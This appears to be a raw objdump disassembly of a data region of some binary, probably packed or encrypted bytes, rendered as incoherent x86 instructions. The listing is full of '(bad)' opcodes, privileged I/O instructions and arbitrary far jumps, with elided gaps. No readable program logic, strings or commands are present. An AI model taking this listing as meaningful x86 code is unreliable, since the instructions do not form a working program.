  42f0e1:	dec    edx
  42f0e2:	enter  0xcd72,0xdd
  42f0e6:	pop    edx
  42f0e7:	jno    0x42f0b2
  42f0e9:	xor    bh,BYTE PTR [edx]
  42f0eb:	ins    BYTE PTR es:[edi],dx
  42f0ec:	test   ah,dl
  42f0ee:	iret   
  42f0ef:	jb     0x42f15d
  42f0f1:	into   
  42f0f2:	jne    0x42f13d
  42f0f4:	sbb    eax,0x3720ddb7
  42f0f9:	jge    0x42f141
  42f0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0fc:	mov    WORD PTR ds:[edx],cs
  42f0ff:	hlt    
  42f100:	ficomp DWORD PTR [ebx+0x45]
  42f103:	call   0xc38b:0x885fbd64
  42f10a:	xor    al,0xca
  42f10c:	ds jg  0x42f0fe
  42f10f:	test   BYTE PTR [edi-0x5d],ch
  42f112:	lods   eax,DWORD PTR ds:[esi]
  42f113:	and    esp,DWORD PTR [ebx+0x60885493]
  42f119:	jmp    0x1e0f:0x415c531e
  42f120:	(bad)  
  42f122:	inc    ecx
  42f123:	inc    ebp
  42f124:	das    
  42f125:	adc    eax,0xb50e49f0
  42f12a:	retf   
  42f12b:	or     ah,BYTE PTR [ebx]
  42f12d:	adc    edi,esp
  42f12f:	je     0x42f0d0
  42f131:	xchg   esi,eax
  42f132:	ins    BYTE PTR es:[edi],dx
  42f133:	lock mov eax,0x0
	...
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f1eb
  42f1a3:	jne    0x42f1c1
  42f1a5:	stc    
  42f1a6:	(bad)  
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    BYTE PTR [ecx+0x44d6f01d],bh
  42f1b3:	mov    bl,0x17
  42f1b5:	cli    
  42f1b6:	dec    ebx
  42f1b7:	push   0x4e
  42f1b9:	das    
  42f1ba:	ltr    WORD PTR [edi+0xdc709a9]
  42f1c1:	out    0x3f,eax
  42f1c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1c4:	cdq    
  42f1c5:	inc    ebx
  42f1c6:	sar    bl,cl
  42f1c8:	push   eax
  42f1c9:	lahf   
  42f1ca:	pop    ss
  42f1cb:	xchg   edi,eax
  42f1cc:	mov    eax,0x56cf7786
  42f1d1:	mov    ecx,esp
  42f1d3:	push   0xffffff8b
  42f1d5:	in     eax,dx
  42f1d6:	call   0x42d4:0x66decc4f
  42f1dd:	add    esp,DWORD PTR [esp+eax*1+0x35]
  42f1e1:	out    0xbe,al
  42f1e3:	shl    BYTE PTR [ebp+0x13261700],1
  42f1e9:	push   esp
  42f1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1eb:	(bad)  
  42f1ec:	fnstcw WORD PTR [edi-0x37]
  42f1ef:	push   0x61
  42f1f1:	dec    eax
  42f1f2:	push   ecx
  42f1f3:	cdq    
  42f1f4:	adc    ebx,DWORD PTR ds:0x97a68a4c
  42f1fa:	jnp    0x42f23c
  42f1fc:	mov    al,ds:0xf8ce7f31
  42f201:	jno    0x42f272
  42f203:	jo     0x42f267
  42f205:	xor    esi,DWORD PTR [ecx-0x4ba62d1a]
  42f20b:	cmp    bl,dl
  42f20d:	enter  0xf5f9,0x18
  42f211:	test   eax,0x8f294bee
  42f216:	dec    ecx
  42f217:	xlat   BYTE PTR ds:[ebx]
  42f218:	push   ebp
  42f219:	mov    WORD PTR [edx+0x616a62fd],ds
  42f21f:	call   0xcfc270cb
  42f224:	push   edx
  42f225:	loope  0x42f1c0
  42f227:	je     0x42f257
  42f229:	sbb    eax,ecx
  42f22b:	cmp    eax,0xc9dfffc1
  42f230:	adc    BYTE PTR [esi-0x4f],dh
  42f233:	dec    esi
  42f234:	adc    cl,cl
  42f236:	cmp    al,0x4d
  42f238:	test   eax,0x49db53d1
  42f23d:	sub    BYTE PTR ds:0x6ad75ac,0xb0
  42f244:	push   ds
  42f245:	push   0x53
  42f247:	push   esp
  42f248:	retf   
  42f249:	ds push ebx
  42f24b:	popf   
  42f24c:	bound  esi,QWORD PTR [edi]
  42f24e:	xor    al,0xf
  42f250:	ret    0xeea5
  42f253:	aas    
  42f254:	jp     0x42f28c
  42f256:	sub    esi,DWORD PTR [ecx-0x139438cb]
  42f25c:	xor    BYTE PTR [ebx+0x45c87b21],ch
  42f262:	pop    ecx
  42f263:	in     al,0x3c
  42f265:	sbb    BYTE PTR [edx-0x5fa2c8b3],dh
  42f26b:	sub    DWORD PTR [esi-0x3d],0x922db124
  42f272:	dec    edi
  42f273:	and    eax,0x240d916f
  42f278:	icebp  
  42f279:	push   eax
  42f27a:	into   
  42f27b:	test   eax,0xff058357
  42f280:	mov    eax,ds:0x3e9220ac
  42f285:	mov    edx,0xfdf62dee
  42f28a:	push   edi
  42f28b:	ins    DWORD PTR es:[edi],dx
  42f28c:	sar    ebx,1
  42f28e:	arpl   WORD PTR [esi],di
  42f290:	fld    TBYTE PTR [ebp-0x781df8c8]
  42f296:	or     edi,DWORD PTR [ecx]
  42f298:	in     al,0xb3
  42f29a:	mov    eax,0xf37654fb
  42f29f:	in     eax,0x61
  42f2a1:	mov    bh,0x61
  42f2a3:	cmp    al,0xe5
  42f2a5:	jno    0x42f289
  42f2a7:	xchg   BYTE PTR [edi-0x2612b935],bh
  42f2ad:	dec    ecx
  42f2ae:	jo     0x42f2d9
  42f2b0:	dec    edi
  42f2b1:	xchg   BYTE PTR [ecx-0x7b],al
  42f2b4:	sub    BYTE PTR [eax],al
	...
  42f316:	mov    ebp,0xaf8a081a
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	and    eax,0xe2d7b373
  42f327:	stc    
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    ch,bh
  42f32f:	xchg   esi,eax
  42f330:	xor    DWORD PTR [eax],0x57
  42f333:	dec    edx
  42f334:	stos   DWORD PTR es:[edi],eax
  42f335:	aaa    
  42f336:	xor    al,0x51
  42f338:	xchg   edi,eax
  42f339:	(bad)  
  42f33b:	and    esp,DWORD PTR [ecx+esi*1+0x16beeda7]
  42f342:	ins    BYTE PTR es:[edi],dx
  42f343:	and    al,BYTE PTR [ecx+0x524ce42f]
  42f349:	xor    esi,esi
  42f34b:	scas   eax,DWORD PTR es:[edi]
  42f34c:	jne    0x42f2d6
  42f34e:	cmp    edi,eax
  42f350:	cli    
  42f351:	jp     0x42f309
  42f353:	outs   dx,DWORD PTR ds:[esi]
  42f354:	dec    edx
  42f355:	push   0x3f
  42f357:	mov    ds:0x8c444cab,eax
  42f35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f35d:	mov    cl,0x50
  42f35f:	mov    DWORD PTR ds:0x515244d,ebp
  42f365:	xor    DWORD PTR [eax-0x1b],ebp
  42f368:	aad    0x3f
  42f36a:	mov    eax,ds:0xaeae289
  42f36f:	in     eax,0xf1
  42f371:	or     ch,ah
  42f373:	xchg   DWORD PTR [eax+0x72],edi
  42f376:	fidiv  DWORD PTR [ebp-0x4f5e2b78]
  42f37c:	push   eax
  42f37d:	cmp    bh,0x87
  42f380:	jmp    0xef1c82e3
  42f385:	dec    edx
  42f386:	sar    esp,1
  42f388:	jns    0x42f323
  42f38a:	daa    
  42f38b:	sub    dh,BYTE PTR [eax-0x6a3195c6]
  42f391:	sub    edi,DWORD PTR [esi-0x3dedd099]
  42f397:	cdq    
  42f398:	sti    
  42f399:	dec    edi
  42f39a:	push   ss
  42f39b:	mov    cl,0x91
  42f39d:	ror    DWORD PTR [ecx],1
  42f39f:	pop    edi
  42f3a0:	in     eax,dx
  42f3a1:	cmp    eax,DWORD PTR [ebx]
  42f3a3:	int3   
  42f3a4:	cmp    BYTE PTR [edx-0xd],dh
  42f3a7:	mov    bh,BYTE PTR [ebx-0x19]
  42f3aa:	adc    esi,edx
  42f3ac:	xchg   ebp,eax
  42f3ad:	sub    esi,ebx
  42f3af:	xchg   ebx,eax
  42f3b0:	test   BYTE PTR [eax-0x49c44d71],bl
  42f3b6:	ins    DWORD PTR es:[edi],dx
  42f3b7:	out    0xa4,al
  42f3b9:	xor    BYTE PTR [edi],al
  42f3bb:	cmp    cl,dh
  42f3bd:	sbb    BYTE PTR [edx],al
  42f3bf:	push   ecx
  42f3c0:	out    0x3c,al
  42f3c2:	bound  esp,QWORD PTR es:[ecx-0x12b4730]
  42f3c9:	lock add BYTE PTR [edi+0x4c],dh
  42f3cd:	dec    ecx
  42f3ce:	call   0x210d1d9d
  42f3d3:	jo     0x42f39a
  42f3d5:	dec    esi
  42f3d6:	jns    0x42f3b6
  42f3d8:	je     0x42f3fd
  42f3da:	add    bl,BYTE PTR [edx-0x6e5851df]
  42f3e0:	jno    0x42f3a9
  42f3e2:	dec    ebp
  42f3e3:	test   BYTE PTR [ebx+0x1b732d43],0xa8
  42f3ea:	(bad)  
  42f3eb:	xchg   esp,eax
  42f3ec:	not    DWORD PTR [edi-0x861ee57]
  42f3f2:	test   al,0xa7
  42f3f4:	adc    al,BYTE PTR [ebx+0x11992b19]
  42f3fa:	inc    esi
  42f3fb:	inc    ebp
  42f3fc:	jbe    0x42f41d
  42f3fe:	dec    esp
  42f3ff:	pop    ebx
  42f400:	xor    eax,0x4fe89fc4
  42f405:	adc    ebp,esi
  42f407:	add    al,0xd3
  42f409:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42f40b:	xor    ch,BYTE PTR [esi+0x623c445f]
  42f411:	stc    
  42f412:	mov    WORD PTR [esp+edi*1],?
  42f415:	in     al,dx
  42f416:	xchg   ecx,eax
  42f417:	lock cmp cl,BYTE PTR [ebp-0x540ab483]
  42f41e:	add    eax,0xe6f340d6
  42f423:	ret    
  42f424:	mov    WORD PTR [esi-0x13],?
  42f427:	pop    ss
  42f428:	repz (bad) 
  42f42a:	adc    al,BYTE PTR [edi-0x3d]
  42f42d:	mov    cl,0x8d
  42f42f:	aad    0x1a
  42f431:	mov    bl,0x5e
  42f433:	pop    edi
  42f434:	inc    DWORD PTR [eax]
	...
  42f496:	aaa    
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	retf   
  42f4a3:	add    ecx,ebx
  42f4a5:	and    cl,ch
  42f4a7:	cli    
  42f4a8:	add    DWORD PTR [eax],eax
  42f4aa:	pop    es
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [ecx],bl
  42f4af:	sbb    dh,dl
  42f4b1:	(bad)  [edx+0x59]
  42f4b5:	mov    eax,ds:0xf686132a
  42f4ba:	mov    esi,0x3a9102a9
  42f4bf:	xor    DWORD PTR [ecx],esp
  42f4c1:	scas   al,BYTE PTR es:[edi]
  42f4c2:	int    0xea
  42f4c4:	test   eax,0x11143477
  42f4c9:	out    0x19,eax
  42f4cb:	int    0x53
  42f4cd:	adc    al,0xbe
  42f4cf:	push   esi
  42f4d0:	jno    0x42f4ea
  42f4d2:	shr    bl,1
  42f4d4:	push   ecx
  42f4d5:	(bad)  
  42f4d7:	jbe    0x42f45f
  42f4d9:	shl    BYTE PTR [esi*4+0x30374ce],0xd0
  42f4e1:	inc    ecx
  42f4e2:	pop    esp
  42f4e3:	int    0xfb
  42f4e5:	ins    BYTE PTR es:[edi],dx
  42f4e6:	stos   BYTE PTR es:[edi],al
  42f4e7:	retf   0x52d4
  42f4ea:	push   0x78
  42f4ec:	and    bh,cl
  42f4ee:	dec    edi
  42f4ef:	fcomip st,st(4)
  42f4f1:	in     al,dx
  42f4f2:	ins    BYTE PTR es:[edi],dx
  42f4f3:	or     dh,cl
  42f4f5:	pushf  
  42f4f6:	out    0x6a,eax
  42f4f8:	mov    al,0x7d
  42f4fa:	dec    ebp
  42f4fb:	int    0x2e
  42f4fd:	and    al,0xc5
  42f4ff:	or     ebx,DWORD PTR [ebp-0x5f3b2d8c]
  42f505:	adc    ecx,DWORD PTR [ecx]
  42f507:	mov    dl,BYTE PTR [esi+0x61]
  42f50a:	jg     0x42f519
  42f50c:	dec    esp
  42f50d:	(bad)  
  42f50e:	pushf  
  42f50f:	add    DWORD PTR [esi+0x2a],edi
  42f512:	push   esp
  42f513:	jle    0x42f544
  42f515:	test   al,0xef
  42f517:	(bad)  
  42f518:	xchg   ebp,eax
  42f519:	daa    
  42f51a:	fdiv   DWORD PTR [edi+0x47]
  42f51d:	adc    dl,BYTE PTR [ecx-0x4b]
  42f520:	(bad)  
  42f521:	dec    ebp
  42f522:	pop    edi
  42f523:	imul   esi,edx,0x45
  42f526:	(bad)  
  42f527:	add    edi,DWORD PTR [edi-0x5059bffd]
  42f52d:	(bad)  
  42f52e:	clc    
  42f52f:	jae    0x42f519
  42f531:	fwait
  42f532:	cwde   
  42f533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f534:	pop    edi
  42f535:	mov    ds:0xc7d98ae0,eax
  42f53a:	ja     0x42f554
  42f53c:	sbb    al,0x9
  42f53e:	into   
  42f53f:	movaps xmm2,XMMWORD PTR [ecx]
  42f542:	pop    edx
  42f543:	inc    eax
  42f544:	mov    edi,edx
  42f546:	ret    0x4175
  42f549:	jmp    0x6d675f0f
  42f54e:	mov    ah,0x8d
  42f550:	push   ebx
  42f551:	sbb    al,0xb
  42f553:	mov    fs,edx
  42f555:	enter  0x6007,0x7c
  42f559:	xchg   esi,eax
  42f55a:	pop    ebx
  42f55b:	(bad)  
  42f55c:	js     0x42f4e6
  42f55e:	push   eax
  42f55f:	int3   
  42f560:	loop   0x42f57e
  42f562:	xchg   ebx,eax
  42f563:	shl    DWORD PTR [edx],0x24
  42f566:	sbb    esp,edx
  42f568:	and    esi,ebx
  42f56a:	ss mov dl,0xf7
  42f56d:	dec    ecx
  42f56e:	call   0x6c1d:0x456354e0
  42f575:	xchg   BYTE PTR ds:0x46ae14e2,dh
  42f57b:	dec    ebp
  42f57c:	pop    edi
  42f57d:	jmp    FWORD PTR [ebp+0x3019eaa]
  42f583:	call   0x5786e9f
  42f588:	or     BYTE PTR [esp+edx*8],cl
  42f58b:	outs   dx,DWORD PTR ds:[esi]
  42f58c:	cmc    
  42f58d:	push   esp
  42f58e:	ins    BYTE PTR es:[edi],dx
  42f58f:	push   cs
  42f590:	push   cs
  42f591:	dec    eax
  42f592:	jecxz  0x42f56c
  42f594:	inc    ebp
  42f595:	pop    ebp
  42f596:	imul   ebp,DWORD PTR [ecx+0x5984cadf],0x14
  42f59d:	push   eax
  42f59e:	mov    ebx,esp
  42f5a0:	inc    esi
  42f5a1:	out    0x6,al
  42f5a3:	dec    edx
  42f5a4:	cmp    bl,bh
  42f5a6:	xor    edi,DWORD PTR [ebx-0x59]
  42f5a9:	loope  0x42f5a1
  42f5ab:	scas   al,BYTE PTR es:[edi]
  42f5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5ad:	lods   eax,DWORD PTR ds:[esi]
  42f5ae:	jg     0x42f5ef
  42f5b0:	add    bh,bl
  42f5b2:	push   0xed53
	...
  42f613:	add    BYTE PTR [eax],al
  42f615:	add    BYTE PTR [esi],bh
  42f617:	push   esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x55]
  42f623:	hlt    
  42f624:	(bad)  
  42f625:	(bad)  
  42f626:	lock sti 
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [edx-0x75f04619],dh
  42f633:	jp     0x42f64d
  42f635:	mov    eax,esi
  42f637:	outs   dx,DWORD PTR ds:[esi]
  42f638:	or     BYTE PTR [ecx-0x6d],bh
  42f63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f63c:	sub    eax,0xd7fc513d
  42f641:	mov    edi,0x34670202
  42f646:	jbe    0x42f61b
  42f648:	scas   eax,DWORD PTR es:[edi]
  42f649:	test   BYTE PTR [eax-0x21],0x81
  42f64d:	dec    bp
  42f64f:	inc    edi
  42f650:	pushf  
  42f651:	or     DWORD PTR [ecx+0x5f51dbb2],edi
  42f657:	cmpxchg DWORD PTR [ebx],esi
  42f65a:	add    al,0x3a
  42f65c:	mov    al,0x35
  42f65e:	and    ah,ch
  42f660:	scas   al,BYTE PTR es:[edi]
  42f661:	xor    esp,edx
  42f663:	mov    al,0x69
  42f665:	outs   dx,BYTE PTR ds:[esi]
  42f666:	mov    cl,BYTE PTR [edx+0x74]
  42f669:	lods   eax,DWORD PTR ds:[esi]
  42f66a:	pop    es
  42f66b:	mov    dl,0xa9
  42f66d:	pusha  
  42f66e:	in     eax,0xfa
  42f670:	bound  ecx,QWORD PTR [edx+ecx*4]
  42f673:	imul   edi,DWORD PTR [ebx],0x4476b7cd
  42f679:	(bad)  
  42f67a:	(bad)  
  42f67b:	mov    esi,0x718bdd24
  42f680:	lahf   
  42f681:	adc    esp,DWORD PTR [edi-0x352793fb]
  42f687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f688:	sbb    al,0x6f
  42f68a:	stos   DWORD PTR es:[edi],eax
  42f68b:	jbe    0x42f62a
  42f68d:	or     esp,edx
  42f68f:	(bad)  
  42f690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f691:	lea    esp,fs:[edx-0x39c890cd]
  42f698:	sub    eax,0x7c29c7e
  42f69d:	repz les esi,FWORD PTR [edi+0x570b8803]
  42f6a4:	or     edx,DWORD PTR ss:[eax+0x48420af8]
  42f6ab:	fsub   QWORD PTR [edi-0x69]
  42f6ae:	xlat   BYTE PTR ds:[ebx]
  42f6af:	xor    DWORD PTR [edi-0x14],ecx
  42f6b2:	mov    al,0x76
  42f6b4:	fwait
  42f6b5:	out    dx,eax
  42f6b6:	adc    cl,BYTE PTR [ecx+edi*1-0x63]
  42f6ba:	sub    esp,edi
  42f6bc:	out    0x24,al
  42f6be:	idiv   BYTE PTR [esi+0x3846a5d3]
  42f6c4:	pop    edi
  42f6c5:	stos   BYTE PTR es:[edi],al
  42f6c6:	into   
  42f6c7:	push   esp
  42f6c8:	xor    eax,0xc1221179
  42f6cd:	adc    esi,DWORD PTR [edi]
  42f6cf:	mov    WORD PTR [eax-0x56],gs
  42f6d2:	adc    eax,0x433614b4
  42f6d7:	fld    TBYTE PTR [ecx+0x14]
  42f6da:	jmp    0x717a:0xfeb42413
  42f6e1:	push   0x85aee409
  42f6e6:	int3   
  42f6e7:	fst    DWORD PTR [edi+0x4216d4d3]
  42f6ed:	xchg   edx,eax
  42f6ee:	sbb    al,0x49
  42f6f0:	dec    esi
  42f6f1:	pop    ebx
  42f6f2:	jno    0x42f754
  42f6f4:	bound  ebx,QWORD PTR [esi+0x5e]
  42f6f7:	das    
  42f6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6f9:	(bad)  
  42f6fb:	sbb    BYTE PTR [edi+0x4d],al
  42f6fe:	test   eax,0x929bec95
  42f703:	and    eax,0xcf0015ff
  42f708:	bnd jne 0x42f6da
  42f70b:	aam    0x4
  42f70d:	inc    esp
  42f70e:	cmp    al,0xca
  42f710:	mov    bh,0x36
  42f712:	cmp    ecx,DWORD PTR [eax]
  42f714:	mov    DWORD PTR ds:0x512845b6,edi
  42f71a:	sar    ebp,1
  42f71c:	sub    ebp,DWORD PTR [ebp-0x7ae4f63a]
  42f722:	jb     0x42f735
  42f724:	push   ebp
  42f725:	sbb    al,0x8d
  42f727:	popf   
  42f728:	enter  0xf988,0x3
  42f72c:	addr16 jbe 0x42f7a5
  42f72f:	and    ecx,DWORD PTR [edx]
  42f731:	or     eax,0xa827c
	...
  42f796:	jno    0x42f739
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	test   BYTE PTR [esi-0x308ebf2],0x1
  42f7a9:	add    BYTE PTR [edi],al
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [ecx+0x66831112],dl
  42f7b3:	sub    DWORD PTR ds:0x687bbf94,ebp
  42f7b9:	sbb    DWORD PTR [edi+0x2ac213f3],0x7289716f
  42f7c3:	pop    edi
  42f7c4:	inc    edi
  42f7c5:	lds    ebx,FWORD PTR [ecx]
  42f7c7:	shr    BYTE PTR [edx-0x1ab7b088],1
  42f7cd:	pop    ecx
  42f7ce:	in     al,dx
  42f7cf:	mov    cl,0x11
  42f7d1:	xor    DWORD PTR [ebp-0x67],0xfffffff0
  42f7d5:	inc    edi
  42f7d6:	jae    0x42f831
  42f7d8:	sbb    al,0x61
  42f7da:	out    0x72,eax
  42f7dc:	imul   edi,DWORD PTR [edi-0x3e],0x63c18026
  42f7e3:	mov    eax,0x188597ab
  42f7e8:	inc    esi
  42f7e9:	jo     0x42f83c
  42f7eb:	inc    esp
  42f7ec:	and    bl,BYTE PTR [ebx]
  42f7ee:	or     BYTE PTR [esp+eiz*4-0x5a9850d8],0xac
  42f7f6:	rcl    BYTE PTR [edi],0xcd
  42f7f9:	fldcw  WORD PTR [ebx-0x755c8544]
  42f7ff:	pop    es
  42f800:	and    al,0x5b
  42f802:	stos   BYTE PTR es:[edi],al
  42f803:	jo     0x42f861
  42f805:	xor    edi,DWORD PTR [edi-0x4c]
  42f808:	sub    al,0xab
  42f80a:	jle    0x42f7a1
  42f80c:	arpl   WORD PTR [ebx],di
  42f80e:	lea    ecx,[edi]
  42f810:	adc    DWORD PTR [ecx+0x3e],0xf736260e
  42f817:	xor    DWORD PTR [ebp+0x30],edi
  42f81a:	dec    ecx
  42f81b:	mov    esp,DWORD PTR [edi+0x47a629d4]
  42f821:	ss scas al,BYTE PTR es:[edi]
  42f823:	jae    0x42f8a3
  42f825:	add    BYTE PTR [edi],ch
  42f827:	sub    dh,ah
  42f829:	mov    edx,0x1e22723b
  42f82e:	jae    0x42f7e7
  42f830:	push   edi
  42f831:	imul   eax,DWORD PTR [ecx],0xffffffac
  42f834:	fs js  0x42f843
  42f837:	sub    DWORD PTR [edi-0x2a7fee38],eax
  42f83d:	cmp    bh,BYTE PTR [edx+edx*2+0x60f256ec]
  42f844:	sbb    al,ch
  42f846:	xchg   edi,eax
  42f847:	lods   eax,DWORD PTR ds:[esi]
  42f848:	mov    al,ds:0x9827b45a
  42f84d:	jmp    FWORD PTR [edi+edx*1-0x7e]
  42f851:	mov    ds:0x2da8d0b3,eax
  42f856:	jmp    eax
  42f858:	sbb    DWORD PTR [ebx],ecx
  42f85a:	js     0x42f861
  42f85c:	jmp    0xaa20:0x8852d6e5
  42f863:	mov    edi,0xc773dc90
  42f868:	fcomp  st(1)
  42f86a:	ret    
  42f86b:	popf   
  42f86c:	retf   
  42f86d:	aas    
  42f86e:	or     eax,ebx
  42f870:	or     bh,ah
  42f872:	ror    BYTE PTR fs:[ecx+0x5f],1
  42f876:	jecxz  0x42f837
  42f878:	add    al,0x9c
  42f87a:	and    BYTE PTR [edi],dh
  42f87c:	stc    
  42f87d:	add    eax,0x959e4498
  42f882:	pop    esi
  42f883:	ret    
  42f884:	cmc    
  42f885:	aaa    
  42f886:	(bad)  
  42f887:	fdivr  QWORD PTR [ebp+0x15]
  42f88a:	dec    edi
  42f88b:	mov    DWORD PTR [esi-0x1c9e8478],esp
  42f891:	gs mov eax,0xc1bc4b80
  42f897:	cmc    
  42f898:	jp     0x42f882
  42f89a:	push   ecx
  42f89b:	mov    eax,ds:0x266810d7
  42f8a0:	scas   eax,DWORD PTR es:[edi]
  42f8a1:	cmc    
  42f8a2:	mov    ch,0xf1
  42f8a5:	push   ds
  42f8a6:	push   esp
  42f8a7:	retf   0x32e0
  42f8aa:	ins    BYTE PTR es:[edi],dx
  42f8ab:	inc    ebp
  42f8ac:	push   esp
  42f8ad:	xchg   ebx,eax
  42f8ae:	mov    eax,0x3222dd61
  42f8b3:	adc    DWORD PTR [eax+0x0],edx
	...
  42f915:	add    BYTE PTR [esp+esi*2],dl
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx-0x68874b64],1
  42f925:	and    al,0xfe
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    bh,cl
  42f92f:	pop    ebx
  42f930:	out    0xc7,al
  42f932:	fisttp QWORD PTR [esi]
  42f934:	sub    al,0x37
  42f936:	ret    0xf599
  42f939:	push   esi
  42f93a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f93b:	lds    ecx,FWORD PTR [ebx]
  42f93d:	leave  
  42f93e:	dec    DWORD PTR [ebx]
  42f940:	outs   dx,DWORD PTR ds:[esi]
  42f941:	outs   dx,BYTE PTR ds:[esi]
  42f942:	mov    esp,edi
  42f944:	lahf   
  42f945:	push   cs
  42f946:	pusha  
  42f947:	jmp    0x7fd0972
  42f94c:	aas    
  42f94d:	mov    al,ds:0x527423cb
  42f952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f953:	mov    BYTE PTR [ecx+eax*4-0x1212b535],dh
  42f95a:	jmp    0xf705:0x5a780196
  42f961:	scas   eax,DWORD PTR es:[edi]
  42f962:	dec    ebp
  42f963:	gs shl ah,cl
  42f966:	imul   esi,DWORD PTR [ecx-0x25],0x20fee0d2
  42f96d:	nop
  42f96e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f96f:	rcl    DWORD PTR [esi],cl
  42f971:	and    BYTE PTR gs:[edx+0x61],al
  42f975:	fs jp  0x42f8fc
  42f978:	mov    dl,0xc8
  42f97a:	(bad)  
  42f97b:	push   ss
  42f97c:	sbb    cl,BYTE PTR [esi-0x6f]
  42f97f:	jnp    0x42f90b
  42f981:	jnp    0x42f96f
  42f983:	leave  
  42f984:	test   al,0xd4
  42f986:	rcr    BYTE PTR [edi+0x122a28ad],0x31
  42f98d:	sub    al,0xc
  42f98f:	dec    edi
  42f990:	xchg   ebx,eax
  42f991:	gs mov edi,0x4719f5f8
  42f997:	shl    dh,1
  42f999:	inc    edx
  42f99a:	sub    DWORD PTR [esi],esp
  42f99c:	xchg   ebp,eax
  42f99d:	icebp  
  42f99e:	nop
  42f99f:	enter  0x7216,0xc8
  42f9a3:	inc    edi
  42f9a4:	in     al,0x17
  42f9a6:	push   cs
  42f9a7:	cdq    
  42f9a8:	xlat   BYTE PTR ds:[ebx]
  42f9a9:	mov    ds:0xcf3ed570,eax
  42f9ae:	mov    ch,0x7d
  42f9b0:	hlt    
  42f9b1:	pop    ebp
  42f9b2:	jp     0x42fa26
  42f9b4:	mov    ah,0x8f
  42f9b6:	repnz add BYTE PTR [edx],dh
  42f9b9:	stc    
  42f9ba:	and    al,0xac
  42f9bc:	(bad)
  42f9bf:	lock add DWORD PTR [esi],eax
  42f9c2:	sub    eax,0x8dd637ae
  42f9c7:	pop    edi
  42f9c8:	cwde   
  42f9c9:	scas   al,BYTE PTR es:[edi]
  42f9ca:	inc    esi
  42f9cb:	in     al,0xcd
  42f9cd:	add    al,0xd1
  42f9cf:	into   
  42f9d0:	aas    
  42f9d1:	in     eax,0x34
  42f9d3:	and    BYTE PTR [esi],ch
  42f9d5:	jno    0x42f9e9
  42f9d7:	nop
  42f9d8:	or     eax,0xd2c39c
  42f9dd:	(bad)  
  42f9de:	lds    ebx,FWORD PTR [eax]
  42f9e0:	push   es
  42f9e1:	inc    eax
  42f9e2:	sbb    DWORD PTR [eax-0x111dbbb6],esp
  42f9e8:	jbe    0x42f9e0
  42f9ea:	mov    ah,0xed
  42f9ec:	xchg   esi,eax
  42f9ed:	pop    esi
  42f9ee:	mov    dh,0x39
  42f9f0:	inc    edx
  42f9f1:	mov    cl,0x57
  42f9f3:	cs (bad) 
  42f9f5:	ficomp WORD PTR [ebp+edx*4+0x50]
  42f9f9:	(bad)  
  42f9fa:	ds pushf 
  42f9fc:	pop    edi
  42f9fd:	pop    ebp
  42f9fe:	sbb    ch,dh
  42fa00:	or     al,0x94
  42fa02:	sahf   
  42fa03:	(bad)  
  42fa04:	adc    al,0xc
  42fa06:	mov    bl,0xc1
  42fa08:	mov    ecx,0xc6369b64
  42fa0d:	or     ah,BYTE PTR [esi]
  42fa0f:	pop    ecx
  42fa10:	scas   eax,DWORD PTR es:[edi]
  42fa11:	test   al,0x8b
  42fa13:	xchg   ebp,eax
  42fa14:	jo     0x42fa5e
  42fa16:	mov    ecx,0x5c2b05fb
  42fa1b:	and    ebx,0x58767042
  42fa21:	jbe    0x42fa6e
  42fa23:	push   ebx
  42fa24:	out    dx,al
  42fa25:	retf   0x90e9
  42fa28:	pop    esi
  42fa29:	or     eax,0x8fae9497
  42fa2e:	mov    BYTE PTR [edx+esi*2-0x3f4a5cd0],al
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	ja     0x42faf1
  42faa4:	sahf   
  42faa5:	and    BYTE PTR ds:0x70001ff,al
